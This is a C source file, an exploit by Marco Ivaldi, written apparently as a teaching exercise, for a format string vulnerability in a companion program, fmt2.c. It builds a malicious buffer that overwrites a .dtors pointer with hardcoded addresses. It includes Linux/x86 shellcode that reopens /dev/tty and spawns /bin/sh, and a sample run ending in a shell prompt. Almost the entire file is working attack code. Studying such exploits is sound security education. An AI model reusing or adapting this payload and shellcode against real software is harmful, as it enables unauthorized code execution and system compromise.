/*
 * $Id: fmt2-ex.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * fmt2-ex.c - fmt2.c exploit (format string exploitation)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Now we are exploiting a format string vulnerability in a buffer supplied
 * by the read() function. Note the special stdin re-open shellcode for 
 * Linux/x86 (see also http://www.0xdeadbeef.info/code/gets-linux.c). Tested
 * on Linux 2.4.x with gcc-3.2/3.3.1 (offset = 2) and gcc-2.95.4 (offset = 4).
 *
 * Malicious buffer structure:
 * [address part w/o dummies] [special write string] [nops] [special shellcode]
 * 
 * Usage: ./fmt2-ex <offset to first address> <offset to ret address>
 *
 * $ uname -a
 * Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./fmt2-ex 4 100 | ./fmt2
 * Using .dtors address    : 0x8049650
 * Using ret address       : 0xbffff8e8
 * [...]
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF		512		// max size of the malicious buffer
#define	RET		0xbffff8e8	// hardcoded value found during tests
#define	DTORS		0x0804964c + 4	// address of first pointer in .dtors
#define	OFFSET		4		// offset to first address on stack
#define NOP		0x90		// use nops padding

/* split an address in 2 words */
#define SPLITW( w1, w2, addr ) {	\
	w1 = (addr & 0x0000ffff);	\
	w2 = (addr & 0xffff0000) >> 16;	\
}

char sc[] = /* linux/x86 shellcode (8 + 23 + 24  = 55 bytes) */
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

unsigned long getesp()
{
	__asm__("movl %esp, %eax");
}

int main(int argc, char **argv)
{
	char 	buf[BUF], nop[BUF / 2];
	int 	offset = OFFSET, ret = RET;
	int 	n1, n2, ret1, ret2;

	char 	*p = buf;

	/* check command line for offsets */
	if (argc > 1)
		offset = atoi(argv[1]);
	if (argc > 2)
		ret = getesp() - atoi(argv[2]); /* try values around 0 */

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the NOP sled */
	memset(nop, NOP, sizeof(nop) - 1);
	nop[sizeof(nop) - 1] = 0x0;

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(DTORS);
	p += 4;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - strlen(buf))		% 0x10000;
	n2 = (ret2 - strlen(buf) - n1) 		% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%%d$hn%%.%du%%%d$hn%s%s", n1, offset, n2, offset + 1, nop, sc);

	/* print some output */
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);
	fprintf(stderr, "Using ret address\t: %p\n\n", ret);

	/* output the malicious format string */
	fprintf(stdout, "%s", buf);

	exit(0);
}
